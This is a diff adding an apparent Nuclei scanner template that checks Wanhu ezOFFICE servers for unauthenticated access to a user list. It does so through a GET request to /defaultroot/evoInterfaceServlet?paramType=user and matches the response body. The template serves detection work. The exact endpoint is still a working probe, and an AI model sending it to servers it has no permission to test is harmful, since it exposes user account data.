@@ -1,0 +1,17 @@
+id: wanhu-ezoffice-database-unauthorized-access
+info:
+  name: "Wanhu ezOFFICE 默认接口 evoInterfaceServlet 数据库用户未授权访问"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: wanhu,ezoffice
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/evoInterfaceServlet?paramType=user"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{result:'success', data:{\"userLis"
+          - "userLis"
